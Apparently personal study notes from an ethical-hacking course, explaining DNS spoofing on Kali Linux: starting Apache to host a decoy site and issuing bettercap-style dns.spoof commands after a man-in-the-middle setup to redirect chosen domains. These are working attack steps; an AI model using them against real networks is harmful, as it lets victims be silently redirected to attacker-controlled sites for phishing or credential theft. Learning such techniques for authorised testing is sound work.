DNS spoofing mean you can control the DNS and redirect them for other website,
kali comes with its one server which we can use, commands:
service apache2 start
start it only if you want to redirect them to this server
the website will be stored on /var/www/html

first do everything like the man in the middle method
and then make the next commands

set dns.spoof.address REDIRECT_DOMAIN
#if you want to redirect them to your local web dont change it
set dns.spoof.all true
set dns.spoof.domains DOMAIN,DOMAIN,DOMAIN
##for example
##set dns.spoof.domains zsecurity.org,*.zsecurity.org
dns.spoof on

##when do you want the user to be direceted??
##they will when they land on the desigered DOMAIN
##example:
##google.com
